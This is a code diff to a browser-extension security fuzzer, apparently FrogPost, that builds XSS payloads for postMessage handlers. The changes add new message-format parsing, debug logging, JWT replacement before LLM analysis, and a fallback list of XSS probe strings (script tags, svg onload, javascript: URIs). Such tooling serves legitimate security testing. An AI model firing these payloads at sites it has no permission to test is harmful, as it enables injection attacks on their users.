@@ -1,7 +1,7 @@
 /**
  * FrogPost Extension
- * Originally Created by thisis0xczar/Lidor JFrog AppSec Team
- * Refined on: 2025-05-07
+ * Originally Created by thisis0xczar/Lidor 
+ * Refined on: 2025-09-04
  */
 (function(global) {
     const JWT_REGEX = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
@@ -20,7 +20,38 @@
             this.messages = Array.isArray(messages) ? messages : []; this.handlerCode = handlerCode || ''; this.targetUrl = targetUrl; this.callbackUrl = callbackUrl; this.originValidationChecks = Array.isArray(originChecks) ? originChecks : []; this.messageStructures = [];
             if (this.messages?.length > 0) this.messages.forEach((msg) => { let data = msg.data !== undefined ? msg.data : msg; });
             this.vulnerablePaths = (sinks || []).map(sink => { let targetProperty = "message"; if (sink.property) targetProperty = sink.property; else if (sink.path && sink.path !== '(root)') targetProperty = sink.path; else if (sink.context && typeof sink.context === 'string') { const ctxMatch = sink.context.match(/(?:event|e|msg|message)\.data\.([a-zA-Z0-9_$.[\]]+)/); if (ctxMatch?.[1]) targetProperty = ctxMatch[1]; } return { path: targetProperty, fullPath: `event.data.${targetProperty}`, sinkType: sink.type || sink.name || "unknown", severity: sink.severity?.toLowerCase() || "high", }; }).filter(p => p.path);
-            if (this.messages?.length > 0) { for (const msg of this.messages) { let msgData = msg.data !== undefined ? msg.data : msg; let dataType = typeof msgData; if (dataType === 'string') { if (msgData.startsWith('{') && msgData.endsWith('}') || msgData.startsWith('[') && msgData.endsWith(']')) try { msgData = JSON.parse(msgData); dataType = typeof msgData; } catch {} } if (this.isPlainObject(msgData)) this.messageStructures.push({ type: 'object', original: JSON.parse(JSON.stringify(msgData)), fields: this.extractAllFields(msgData), fieldTypes: this.getFieldTypes(msgData) }); else if (dataType === 'string') this.messageStructures.push({ type: 'raw_string', original: msgData }); } }
+            if (this.messages?.length > 0) {
+                for (const msg of this.messages) {
+                    const raw = (msg && Object.prototype.hasOwnProperty.call(msg, 'data')) ? msg.data : msg;
+                    const det = this._detectStringEnvelope(raw);
+                    if (det.kind === 'json') {
+                        const fields = this.extractAllFields(det.value);
+                        this.messageStructures.push({
+                            type: 'object',
+                            original: det.value,
+                            pathsToFuzz: fields,
+                            fields: fields,
+                            fieldTypes: this.getFieldTypes(det.value),
+                            _envelope: det.envelope
+                        });
+                    } else if (det.kind === 'kv') {
+                        this.messageStructures.push({ type: 'kv', original: det.map, _envelope: det.envelope });
+                    } else if (this.isPlainObject(raw)) {
+                        const fields = this.extractAllFields(raw);
+                        this.messageStructures.push({
+                            type: 'object',
+                            original: raw,
+                            pathsToFuzz: fields,
+                            fields: fields,
+                            fieldTypes: this.getFieldTypes(raw)
+                        });
+                    } else if (Array.isArray(raw)) {
+                        this.messageStructures.push({ type: 'array', original: raw });
+                    } else {
+                        this.messageStructures.push({ type: 'raw_string', original: raw });
+                    }
+                }
+            }
             if (this.messageStructures.length === 0 && this.vulnerablePaths.length > 0) { const defObj = { type: 'default_generated' }; const firstPath = this.vulnerablePaths[0]?.path || "message"; defObj[firstPath] = `Default Content for ${firstPath}`; this.messageStructures.push({ type: 'object', original: defObj, fields: this.extractAllFields(defObj), fieldTypes: this.getFieldTypes(defObj) }); }
             if (callbackUrl) this.callbackUrl = callbackUrl; return this;
         }
@@ -29,8 +60,37 @@
         getFieldTypes(obj, prefix = '') { const res = {}; if (!this.isPlainObject(obj)) return res; for (const key in obj) { if (!obj.hasOwnProperty(key)) continue; const p = prefix ? `${prefix}.${key}` : key; res[p] = typeof obj[key]; if (this.isPlainObject(obj[key])) Object.assign(res, this.getFieldTypes(obj[key], p)); } return res; }
         extractAllFields(obj, prefix = '') { const fields = []; if (!this.isPlainObject(obj)) return fields; for (const key in obj) { if (!obj.hasOwnProperty(key)) continue; const p = prefix ? `${prefix}.${key}` : key; fields.push(p); if (this.isPlainObject(obj[key])) fields.push(...this.extractAllFields(obj[key], p)); } return fields; }
 
+        _detectStringEnvelope(input) {
+            const out = { kind: 'none', value: null, envelope: null };
+            if (typeof input !== 'string') return out;
+            const s = input.trim();
+            if (/^[\[{]/.test(s)) { try { out.value = JSON.parse(s); out.kind = 'json'; out.envelope = { prefix: '', suffix: '' }; return out; } catch {} }
+            const m = s.match(/^([a-z0-9_:+-]{2,16})\s*[:=]\s*(\{[\s\S]*\}|\[[\s\S]*\])$/i);
+            if (m) { try { out.value = JSON.parse(m[2]); out.kind = 'json'; out.envelope = { prefix: m[1] + (s.includes(':')?':':'='), suffix: '' }; return out; } catch {} }
+            if (/^[^=&?]+=[^=&?]+(&[^=&?]+=[^=&?]+)*$/.test(s)) {
+                const map = Object.fromEntries(s.split('&').map(p => p.split('=').map(decodeURIComponent)).map(([k,v]) => [k, v]));
+                out.kind = 'kv'; out.map = map; out.envelope = { kv: true }; return out;
+            }
+            return out;
+        }
+
+        _wrapLikeOriginal(struct, mutated) {
+            const env = struct?._envelope;
+            if (!env) return mutated;
+            if (struct.type === 'object' && env.prefix !== undefined) {
+                return `${env.prefix}${JSON.stringify(mutated)}`;
+            }
+            if (struct.type === 'kv' && env.kv) {
+                return Object.entries({ ...struct.original, ...mutated })
+                    .map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
+            }
+            return mutated;
+        }
+
         runPayloadGeneration() {
             this.payloads = [];
+            
+            console.log(`[Fuzzer] Starting payload generation. Message structures:`, this.messageStructures.map(s => ({type: s.type, original: typeof s.original})));
 
             return new Promise((resolve) => {
                 chrome.storage.session.get(['customXssPayloads', 'callback_url'], (result) => {
@@ -40,6 +100,7 @@
 
                     const hasDomSinks = (this.staticAnalysisResults?.sinks || []).length > 0;
                     const shouldUseStructuredPayloads = !this.isSilentHandler || hasDomSinks;
+                    console.log(`[Fuzzer] shouldUseStructuredPayloads: ${shouldUseStructuredPayloads}, isSilentHandler: ${this.isSilentHandler}, hasDomSinks: ${hasDomSinks}`);
 
                     if (customPayloads.length > 0) {
                         if (this.messageStructures.length > 0) {
@@ -62,9 +123,9 @@
                                                         this.setNestedValue(modMsg, path, payload);
                                                         this.payloads.push({
                                                             type: 'custom-structured',
-                                                            payload: modMsg,
+                                                            payload: this._wrapLikeOriginal(struct, modMsg),
                                                             targetPath: path,
-                                                            description: `Custom payload in structured message`
+                                                            description: `Custom payload into ${path}`
                                                         });
                                                     } catch (e) {}
                                                 }
@@ -150,13 +211,32 @@
 
                     } else {
                         const allXssPayloads = window.FuzzingPayloads?.XSS || [];
-                        const payloadList = allXssPayloads;
+                        let payloadList = [...allXssPayloads];
+                        console.log(`[Fuzzer] Using built-in XSS payloads. Count: ${payloadList.length}`);
+                        
+                        if (payloadList.length === 0) {
+                            console.warn(`[Fuzzer] No built-in payloads found, using fallback payloads`);
+                            payloadList = [
+                                '<script>alert(1)</script>',
+                                '><svg onload=alert(1)>',
+                                'javascript:alert(1)',
+                                '">alert(1)</script>',
+                                "';alert(1);//",
+                                'data:text/html,<script>alert(1)</script>'
+                            ];
+                        }
 
                         for (const struct of this.messageStructures) {
-                            if (!struct || !struct.original) continue;
+                            if (!struct || !struct.original) {
+                                console.log(`[Fuzzer] Skipping invalid structure:`, struct);
+                                continue;
+                            }
+                            
+                            console.log(`[Fuzzer] Processing structure type: ${struct.type}, shouldUseStructuredPayloads: ${shouldUseStructuredPayloads}`);
 
                             if (shouldUseStructuredPayloads) {
                                 if (struct.type === 'object') {
+                                    console.log(`[Fuzzer] Generating object payloads for:`, struct.original);
                                     if (this.fuzzerConfig.enableSmartFuzzing && this.vulnerablePaths?.length > 0) {
                                         this.generateSmartObjectPayloads(struct, this.vulnerablePaths, payloadList);
                                     }
@@ -167,10 +247,26 @@
                                         this.generatePrototypePollutionPayloads(struct);
                                     }
                                 } else if (struct.type === 'raw_string') {
+                                    console.log(`[Fuzzer] Generating raw string payloads for:`, struct.original);
                                     this.generateRawStringPayloads(struct.original, payloadList);
+                                } else if (struct.type === 'kv') {
+                                    console.log(`[Fuzzer] Processing KV structure:`, struct.original);
+                                    const kvAsObj = { type: 'object', original: struct.original, pathsToFuzz: Object.keys(struct.original), fieldTypes: {} };
+                                    Object.keys(struct.original).forEach(k => kvAsObj.fieldTypes[k] = typeof struct.original[k]);
+                                    this.generateDumbObjectPayloads(kvAsObj, payloadList);
+                                } else if (struct.type === 'array') {
+                                    console.log(`[Fuzzer] Processing array structure:`, struct.original);
+                                    for (let i = 0; i < Math.min(struct.original.length, 5); i++) {
+                                        const arrCopy = [...struct.original];
+                                        for (const p of payloadList.slice(0, 10)) {
+                                            arrCopy[i] = p;
+                                            this.payloads.push({ type: 'array_inject', payload: arrCopy, targetPath: `[${i}]`, severity: 'medium' });
+                                        }
+                                    }
                                 }
                             } else {
                                 if (struct.type === 'raw_string') {
+                                    console.log(`[Fuzzer] Generating raw string payloads (non-structured mode) for:`, struct.original);
                                     this.generateRawStringPayloads(struct.original, payloadList);
                                 }
                             }
@@ -289,7 +385,7 @@
         setNestedValue(obj, path, value) { if (!obj || typeof obj !== 'object' || !path) { if(typeof obj === 'string') return value; return; } const parts = path.match(/([^[.\]]+)|\[['"`]?([^\]'"`]+)['"`]?\]/g) || []; let current = obj; for (let i = 0; i < parts.length - 1; i++) { let part = parts[i]; if (part.startsWith('[')) part = part.substring(1, part.length - 1).replace(/['"`]/g, ''); const nextPartStr = parts[i + 1]; let nextPartNormalized = nextPartStr; if (nextPartNormalized.startsWith('[')) nextPartNormalized = nextPartNormalized.substring(1, nextPartNormalized.length - 1).replace(/['"`]/g, ''); const isNextPartIndex = /^\d+$/.test(nextPartNormalized); if (current[part] === undefined || current[part] === null || typeof current[part] !== 'object') current[part] = isNextPartIndex ? [] : {}; current = current[part]; if (typeof current !== 'object' || current === null) return; } let lastPart = parts[parts.length - 1]; if (lastPart.startsWith('[')) lastPart = lastPart.substring(1, lastPart.length - 1).replace(/['"`]/g, ''); if (typeof current === 'object' && current !== null) { const isIndex = /^\d+$/.test(lastPart); if (Array.isArray(current) && isIndex) current[parseInt(lastPart, 10)] = value; else if (!Array.isArray(current)) current[lastPart] = value; } }
     }
 
-    global.SinkAwarePostMessageFuzzer = class SinkAwarePostMessageFuzzer {
+    class SinkAwarePostMessageFuzzer {
         constructor(messages, handlerCode, sinks, originChecks = []) {
             this.messages = Array.isArray(messages) ? messages : [];
             this.handlerCode = handlerCode || '';
@@ -760,9 +856,52 @@
         }
     }
 
-    if (typeof global !== 'undefined') {
-        global.generatePocHtml = generatePocHtml;
-        global.openPocWindow = openPocWindow;
-    }
+    const sanitizeJwts = (data) => {
+        if (typeof data === 'string') return data.replace(JWT_REGEX, ADMIN_JWT);
+        if (!data || typeof data !== 'object') return data;
+        let cloned; 
+        try { 
+            cloned = typeof structuredClone === 'function' ? structuredClone(data) : JSON.parse(JSON.stringify(data)); 
+        } catch { 
+            return data; 
+        }
+        const processObj = (obj) => { 
+            for (const key in obj) { 
+                if (obj.hasOwnProperty(key)) { 
+                    if (typeof obj[key] === 'string') {
+                        obj[key] = obj[key].replace(JWT_REGEX, ADMIN_JWT);
+                    } else if (typeof obj[key] === 'object' && obj[key] !== null) {
+                        processObj(obj[key]);
+                    } 
+                } 
+            } 
+        };
+        processObj(cloned); 
+        return cloned;
+    };
 
-})(typeof window !== 'undefined' ? window : this);
+    const sanitizeMessagesForLlm = (messages) => {
+        if (!Array.isArray(messages)) return messages;
+        return messages.map(message => {
+            const sanitized = sanitizeJwts(message);
+            if (typeof sanitized === 'object' && sanitized !== null && !Array.isArray(sanitized)) {
+                const originalStr = JSON.stringify(message);
+                const sanitizedStr = JSON.stringify(sanitized);
+                if (originalStr !== sanitizedStr) {
+                    sanitized._jwt_sanitized = true;
+                }
+            }
+            return sanitized;
+        });
+    };
+
+    const exportTarget = typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : this);
+    
+    exportTarget.generatePocHtml = generatePocHtml;
+    exportTarget.openPocWindow = openPocWindow;
+    exportTarget.sanitizeJwts = sanitizeJwts;
+    exportTarget.sanitizeMessagesForLlm = sanitizeMessagesForLlm;
+    exportTarget.JWT_REGEX = JWT_REGEX;
+    exportTarget.ADMIN_JWT = ADMIN_JWT;
+
+})(typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : this));
